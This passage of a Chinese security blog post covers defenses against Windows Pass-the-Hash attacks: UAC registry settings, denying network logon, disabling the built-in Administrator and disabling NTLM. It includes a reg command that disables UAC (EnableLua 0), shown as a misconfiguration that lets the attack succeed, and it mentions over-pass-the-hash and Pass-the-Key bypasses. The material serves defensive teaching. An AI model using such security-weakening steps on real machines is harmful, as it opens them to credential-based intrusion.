<h1 id="0x05-PassTheHash-防御"><a href="#0x05-PassTheHash-防御" class="headerlink" title="0x05 PassTheHash 防御"></a>0x05 PassTheHash 防御</h1><h2 id="拒绝SID500用户从网络登录"><a href="#拒绝SID500用户从网络登录" class="headerlink" title="拒绝SID500用户从网络登录"></a>拒绝SID500用户从网络登录</h2><p>上面我们知道了，将域用户加入受限用户组后能提高防御哈希传递能力，但是如果攻击者获取了本地计算机管理员（SID：500）用户的哈希还是可以利用NTLM哈希进行PTH攻击，那么我们可不可以限制SID500用户进行PTH呢。</p>
<p>经测试以下方法都可以限制默认管理员用户。</p>
<h3 id="FilterAdministratorToken-amp-EnableLua"><a href="#FilterAdministratorToken-amp-EnableLua" class="headerlink" title="FilterAdministratorToken  &amp; EnableLua"></a>FilterAdministratorToken  &amp; EnableLua</h3><p><strong>FilterAdministratorToken</strong></p>
<p><img src="https://images.atsud0.me/images/post/20220226-19:45:30-_KnLxj0_iwqRzj_KnLxj0_1645875930684_KnLxj0_iwqRzj.png" alt="https://images.atsud0.me/images/post/20220226-19:45:30-_KnLxj0_iwqRzj_KnLxj0_1645875930684_KnLxj0_iwqRzj.png"></p>
<p>微软官方文档中有关于此项描述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The User Account Control: Admin Approval Mode for the built-in Administrator account policy setting controls the behavior of Admin Approval Mode for the built-in Administrator account.</span><br><span class="line"></span><br><span class="line">The options are:</span><br><span class="line"></span><br><span class="line">    Enabled. The built-in Administrator account uses Admin Approval Mode. By default, any operation that requires elevation of privilege will prompt the user to approve the operation.</span><br><span class="line"></span><br><span class="line">    Disabled. (Default) The built-in Administrator account runs all applications with full administrative privilege.</span><br></pre></td></tr></table></figure>

<p>大意是默认情况下，该配置是禁用的。内置管理员（SID500的Administrator）能够以最高权限(full administrative)运行所有程序。如果开启的话，内置管理员将会采用管理员审批模式。给内置管理员打开了UAC功能，以管理员模式请求某个程序运行时，都会弹出UAC审批。等同于把内置管理员降级成了自建管理员。</p>
<p>当此配置启用时：</p>
<p><img src="https://images.atsud0.me/images/post/20220226-19:52:06-_hK6Pv4_yWOVCz_hK6Pv4_1645876326299_hK6Pv4_yWOVCz.png" alt="https://images.atsud0.me/images/post/20220226-19:52:06-_hK6Pv4_yWOVCz_hK6Pv4_1645876326299_hK6Pv4_yWOVCz.png"></p>
<p>当此配置禁用时（默认），内置管理员将会以最高权限(full administrative)运行程序：</p>
<p><img src="https://images.atsud0.me/images/post/20220226-19:55:34-_EMcDN3_WK9goj_EMcDN3_1645876534789_EMcDN3_WK9goj.png" alt="https://images.atsud0.me/images/post/20220226-19:55:34-_EMcDN3_WK9goj_EMcDN3_1645876534789_EMcDN3_WK9goj.png"></p>
<p>在本地策略中将用户内置管理员账号的管理员批准模式选项启用，也可以通过注册表修改。</p>
<p>还原默认配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v FilterAdministratorToken /t REG_DWORD /d &quot;0&quot; /f</span><br></pre></td></tr></table></figure>

<p>限制内置管理员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v FilterAdministratorToken /t REG_DWORD /d &quot;1&quot; /f</span><br></pre></td></tr></table></figure>

<p>修改立即生效，不需要重启。</p>
<p><img src="https://images.atsud0.me/images/post/20220226-16:49:36-_9gvky1_fnZMLA_9gvky1_1645865376106_9gvky1_fnZMLA.png" alt="https://images.atsud0.me/images/post/20220226-16:49:36-_9gvky1_fnZMLA_9gvky1_1645865376106_9gvky1_fnZMLA.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220226-16:28:11-_7gKJk1_luUR5b_7gKJk1_1645864091298_7gKJk1_luUR5b.png" alt="https://images.atsud0.me/images/post/20220226-16:28:11-_7gKJk1_luUR5b_7gKJk1_1645864091298_7gKJk1_luUR5b.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220226-16:29:04-_yDArKB_lXJhZc_yDArKB_1645864144778_yDArKB_lXJhZc.png" alt="https://images.atsud0.me/images/post/20220226-16:29:04-_yDArKB_lXJhZc_yDArKB_1645864144778_yDArKB_lXJhZc.png"></p>
<p><strong>Enable Lua</strong></p>
<p>”启用管理审批模式”(Run all administrators in Admin Approval Mode) 该项是默认开启的。</p>
<p><img src="https://images.atsud0.me/images/post/20220226-19:59:29-_jLcWiH_HAlyKk_jLcWiH_1645876769572_jLcWiH_HAlyKk.png" alt="https://images.atsud0.me/images/post/20220226-19:59:29-_jLcWiH_HAlyKk_jLcWiH_1645876769572_jLcWiH_HAlyKk.png"></p>
<p>在微软文档的描述中为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">The User Account Control: Run all administrators Admin Approval Mode policy setting controls the behavior of all UAC policy settings for the computer. If you change this policy setting, you must restart your computer.</span><br><span class="line"></span><br><span class="line">The options are:</span><br><span class="line"></span><br><span class="line">    Enabled. (Default) Admin Approval Mode is enabled. This policy must be enabled and related UAC policy settings must also be set appropriately to allow the built-in Administrator account and all other users who are members of the Administrators group to run in Admin Approval Mode.</span><br><span class="line"></span><br><span class="line">    Disabled. Admin Approval Mode and all related UAC policy settings are disabled.</span><br><span class="line"></span><br><span class="line">Note</span><br><span class="line"></span><br><span class="line">If this policy setting is disabled, the Security Center notifies you that the overall security of the operating system has been reduced.</span><br></pre></td></tr></table></figure>

<p>大意是，该项默认启用（必须），管理员审批模式和UAC策略依赖于该项配置的设置，如果禁用，UAC策略设置也会失效，系统会提示你系统安全水平低。</p>
<p>如果该配置被禁用了，那么自建管理员将会以最高权限(full administrative)运行所有程序，并且UAC策略将会失效。</p>
<p>通过命令快速修改配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v EnableLua /t REG_DWORD /d &quot;0&quot; /f</span><br></pre></td></tr></table></figure>

<p>还原默认配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v EnableLua /t REG_DWORD /d &quot;1&quot; /f</span><br></pre></td></tr></table></figure>

<p>缺点：修改配置后必须重启才能生效。</p>
<p>前面所说的Remote UAC（LocalAccountTokenFilterPolicy）配置为默认，而启用管理审批模式（Enable Lua）被修改为禁用，进行PTH攻击。</p>
<p>可见UAC功能被禁用。而Remote UAC属于是UAC相关配置，依赖于Enable Lua配置，Enable Lua配置为禁用，导致自建管理员用户也能最高权限(full administrative)运行所有程序，从而哈希传递攻击成功。</p>
<p><img src="https://images.atsud0.me/images/post/20220226-20:16:40-_Gl0Gp5_vbr5LT_Gl0Gp5_1645877800889_Gl0Gp5_vbr5LT.png" alt="https://images.atsud0.me/images/post/20220226-20:16:40-_Gl0Gp5_vbr5LT_Gl0Gp5_1645877800889_Gl0Gp5_vbr5LT.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220226-20:21:34-_CY74F9_S8w9Gg_CY74F9_1645878094538_CY74F9_S8w9Gg.png" alt="https://images.atsud0.me/images/post/20220226-20:21:34-_CY74F9_S8w9Gg_CY74F9_1645878094538_CY74F9_S8w9Gg.png"></p>
<h3 id="拒绝网络访问配置"><a href="#拒绝网络访问配置" class="headerlink" title="拒绝网络访问配置"></a>拒绝网络访问配置</h3><p>不过也可以配置指定用户拒绝从网络访问</p>
<p>配置位置：本地安全策略→本地策略→用户权限分配→拒绝从网络访问这台计算机</p>
<p><img src="https://images.atsud0.me/images/post/20220226-17:47:03-_AKsCEm_iGXMqk_AKsCEm_1645868823122_AKsCEm_iGXMqk.png" alt="https://images.atsud0.me/images/post/20220226-17:47:03-_AKsCEm_iGXMqk_AKsCEm_1645868823122_AKsCEm_iGXMqk.png"></p>
<h3 id="禁用内置Administrator"><a href="#禁用内置Administrator" class="headerlink" title="禁用内置Administrator"></a>禁用内置Administrator</h3><p>可以考虑禁用内置的Administrator用户，重新创建一个本地计算机管理员用户，以此来防御。</p>
<p>本地安全策略→本地策略→安全选项→帐户：管理员帐户状态。沟选禁用</p>
<p><img src="https://images.atsud0.me/images/post/20220226-19:17:07-_z2Rc8Z_GEHunJ_z2Rc8Z_1645874227233_z2Rc8Z_GEHunJ.png" alt="https://images.atsud0.me/images/post/20220226-19:17:07-_z2Rc8Z_GEHunJ_z2Rc8Z_1645874227233_z2Rc8Z_GEHunJ.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220226-17:58:44-_nB0p85_tHLkoX_nB0p85_1645869524674_nB0p85_tHLkoX.png" alt="https://images.atsud0.me/images/post/20220226-17:58:44-_nB0p85_tHLkoX_nB0p85_1645869524674_nB0p85_tHLkoX.png"></p>
<h2 id="域内防御方式"><a href="#域内防御方式" class="headerlink" title="域内防御方式"></a>域内防御方式</h2><h3 id="禁用NTLM认证"><a href="#禁用NTLM认证" class="headerlink" title="禁用NTLM认证"></a><strong>禁用NTLM认证</strong></h3><p>下发组策略，禁用NTLM认证。</p>
<p>禁用域的NTLM认证后，尝试利用PTH攻击，会提示请求不支持。</p>
<p><img src="https://images.atsud0.me/images/post/20220226-23:37:34-_XYLjU9_sWkPXi_XYLjU9_1645889854695_XYLjU9_sWkPXi.png" alt="https://images.atsud0.me/images/post/20220226-23:37:34-_XYLjU9_sWkPXi_XYLjU9_1645889854695_XYLjU9_sWkPXi.png"></p>
<p>虽然但是，攻击者还是可以通过ekey进行攻击,或者是使用hash传递进行kerberos认证的。</p>
<p><img src="https://images.atsud0.me/images/post/20220226-23:35:52-_NtBddt_FI4hk5_NtBddt_1645889752104_NtBddt_FI4hk5.png" alt="https://images.atsud0.me/images/post/20220226-23:35:52-_NtBddt_FI4hk5_NtBddt_1645889752104_NtBddt_FI4hk5.png"></p>
<p>或者是over pass the hash攻击,即使用ntlm hash来进行kerberos认证.</p>
<p><img src="https://images.atsud0.me/images/post/20220321-15:30:08-_MJWGom_image-20220321153007894_MJWGom_1647847808243_MJWGom_image-20220321153007894.png" alt="image-20220321153007894"></p>
<p>还有其他方法，比如前文所述的，域功能级别为2012R2域控的可以将域用户添加到受保护的用户组、域策略中下发禁用成员机里的内置管理员等方法。</p>
<h2 id="内容总结"><a href="#内容总结" class="headerlink" title="内容总结"></a>内容总结</h2><p>结论就是：</p>
<p>Windows Visita之后的系统，在打不打KB2871997补丁的情况下，域内用户都不受UAC Remote Restrictions限制，但本地计算机管理员用户受此限制（除了SID为500的Administrator不受限制）。说人话就是，工作组本地计算机管理员不能PTH，除了SID为500的默认管理员用户。</p>
<p>所以KB2871997并没有对工作组本地计算机用户的哈希传递直接进行限制，而是UAC Remote Restrictions限制所造成的。当运维人员错误配置UAC策略（关闭UAC、关闭UAC Remote Restrictions限制）后，即使打了补丁（打不打都一样），SID不为500的计算机管理员用户也能进行PTH攻击。如果需要限制SID为500的默认管理员用户，可以通过禁用内置管理员帐户、拒绝内置管理员网络登录、将内置管理员降权等方法（也许还有其他的方法）来实现限制 。</p>
<p>故网络上部分文章所描述的，”<strong>更新KB2871997后，发现无法使用常规的哈希传递方法进行横向移动，但Administrator账号(SID为500)例外</strong>”说法错误。</p>
<p>但是KB2871997添加了用户注销后清除内存密码的功能，即用户注销后，系统不再在内存中保存明文密码，使得攻击者在抓取内存密码的情况下变得困难。如果目标用户加入了<strong>受保护的用户组</strong>，则相当于直接禁用了NTLM认证，这才能说把Pass The Hash给砍了。但是在这种情况下，我们还是可以想办法获取AESKey后，利用AESkey进行Pass The Key传递（即OverPass The Hash）。如果没有将用户加入受保护的用户组的话，那该补丁的作用只是清除明文凭据罢了。Pass The Hash攻击依然不受影响。</p>
<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>本文简单介绍了NTLM认证的流程、NTLM Hash值，PassTheHash攻击方式以及防御方式。 </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/links/">Friends</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-NTLM-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 NTLM 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">Windows本地认证流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LM-Hash"><span class="toc-number">1.2.</span> <span class="toc-text">LM Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Hash"><span class="toc-number">1.3.</span> <span class="toc-text">NTLM Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">NTLM Hash加密方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-NTLM-hash"><span class="toc-number">1.4.</span> <span class="toc-text">Net-NTLM hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%88NTLM-Challenge%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">NTLM 身份认证（NTLM Challenge）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.</span> <span class="toc-text">认证原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Type-1-%E5%8D%8F%E5%95%86"><span class="toc-number">1.5.2.</span> <span class="toc-text">Type 1 协商</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Type-2-%E8%B4%A8%E8%AF%A2"><span class="toc-number">1.5.3.</span> <span class="toc-text">Type 2 质询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Type-3-%E9%AA%8C%E8%AF%81"><span class="toc-number">1.5.4.</span> <span class="toc-text">Type 3 验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#The-NTLMv2-Response%E7%94%9F%E6%88%90"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">The NTLMv2 Response生成</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E8%8E%B7%E5%8F%96NTLM%E5%8A%A0%E5%AF%86"><span class="toc-number">1.5.5.</span> <span class="toc-text">手动获取NTLM加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%8E%B7%E5%8F%96NTLM%E5%8A%A0%E5%AF%86"><span class="toc-number">1.5.6.</span> <span class="toc-text">脚本获取NTLM加密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP-amp-SSPI"><span class="toc-number">1.6.</span> <span class="toc-text">SSP &amp; SSPI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-NTLM-Relay"><span class="toc-number">2.</span> <span class="toc-text">0x02 NTLM Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Responder-%E5%88%A9%E7%94%A8LLMNR%E5%92%8CNetBIOS%E6%AC%BA%E9%AA%97-WPAD%E5%8A%AB%E6%8C%81-%E8%8E%B7%E5%BE%97Net-NTLMHash"><span class="toc-number">2.1.</span> <span class="toc-text">Responder 利用LLMNR和NetBIOS欺骗 WPAD劫持 获得Net-NTLMHash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WPAD%E5%8A%AB%E6%8C%81"><span class="toc-number">2.2.</span> <span class="toc-text">WPAD劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E-PrintBug"><span class="toc-number">2.3.</span> <span class="toc-text">打印机漏洞 PrintBug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E9%83%A8%E7%BD%B2SMBServer%E6%8A%93NTLM%E5%93%88%E5%B8%8C"><span class="toc-number">2.4.</span> <span class="toc-text">Kali部署SMBServer抓NTLM哈希</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8BSMB%E7%AD%BE%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">探测SMB签名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Responder-MultiRelayx"><span class="toc-number">2.6.</span> <span class="toc-text">Responder-MultiRelayx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impacket-smbrelayx"><span class="toc-number">2.7.</span> <span class="toc-text">impacket-smbrelayx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impacket-ntlmrelayx"><span class="toc-number">2.8.</span> <span class="toc-text">impacket-ntlmrelayx</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-NTLM-Relay-%E9%98%B2%E5%BE%A1"><span class="toc-number">3.</span> <span class="toc-text">0x03 NTLM Relay 防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Pass-The-Hash"><span class="toc-number">4.</span> <span class="toc-text">0x04 Pass The Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">基础利用手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz"><span class="toc-number">4.1.1.</span> <span class="toc-text">Mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impacket"><span class="toc-number">4.1.2.</span> <span class="toc-text">impacket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crackmapexec"><span class="toc-number">4.1.3.</span> <span class="toc-text">crackmapexec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E7%A9%B6KB2871997"><span class="toc-number">4.2.</span> <span class="toc-text">探究KB2871997</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC-Remote-Restrictions"><span class="toc-number">4.2.1.</span> <span class="toc-text">UAC Remote Restrictions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E8%A1%A5%E4%B8%81-LocalAccountTokenFilterPolicy-%E9%BB%98%E8%AE%A4%E5%80%BC"><span class="toc-number">4.2.2.</span> <span class="toc-text">无补丁+LocalAccountTokenFilterPolicy 默认值</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">本地用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">域内用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.2.2.3.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%89%93%E8%A1%A5%E4%B8%81LocalAccountTokenFilterPolicy%E9%85%8D%E7%BD%AE%E4%B8%BA1"><span class="toc-number">4.2.3.</span> <span class="toc-text">无打补丁LocalAccountTokenFilterPolicy配置为1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-1"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">本地用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">域用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="toc-number">4.2.3.3.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E8%A1%A5%E4%B8%81%E6%83%85%E5%86%B5%E6%80%BB%E7%BB%93"><span class="toc-number">4.2.4.</span> <span class="toc-text">无补丁情况总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E4%BA%86%E8%A1%A5%E4%B8%81KB2871997%E4%B8%94LocalAccountTokenFilterPolicy%E4%B8%BA%E9%BB%98%E8%AE%A4"><span class="toc-number">4.2.5.</span> <span class="toc-text">打了补丁KB2871997且LocalAccountTokenFilterPolicy为默认</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-2"><span class="toc-number">4.2.5.1.</span> <span class="toc-text">本地用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7-1"><span class="toc-number">4.2.5.2.</span> <span class="toc-text">域用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-2"><span class="toc-number">4.2.5.3.</span> <span class="toc-text">小结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-PassTheHash-%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">0x05 PassTheHash 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%92%E7%BB%9DSID500%E7%94%A8%E6%88%B7%E4%BB%8E%E7%BD%91%E7%BB%9C%E7%99%BB%E5%BD%95"><span class="toc-number">5.1.</span> <span class="toc-text">拒绝SID500用户从网络登录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FilterAdministratorToken-amp-EnableLua"><span class="toc-number">5.1.1.</span> <span class="toc-text">FilterAdministratorToken  &amp; EnableLua</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE%E9%85%8D%E7%BD%AE"><span class="toc-number">5.1.2.</span> <span class="toc-text">拒绝网络访问配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8%E5%86%85%E7%BD%AEAdministrator"><span class="toc-number">5.1.3.</span> <span class="toc-text">禁用内置Administrator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">域内防御方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8NTLM%E8%AE%A4%E8%AF%81"><span class="toc-number">5.2.1.</span> <span class="toc-text">禁用NTLM认证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93"><span class="toc-number">5.3.</span> <span class="toc-text">内容总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x06 总结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)&body=Check out this article: https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2024
    atsud0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
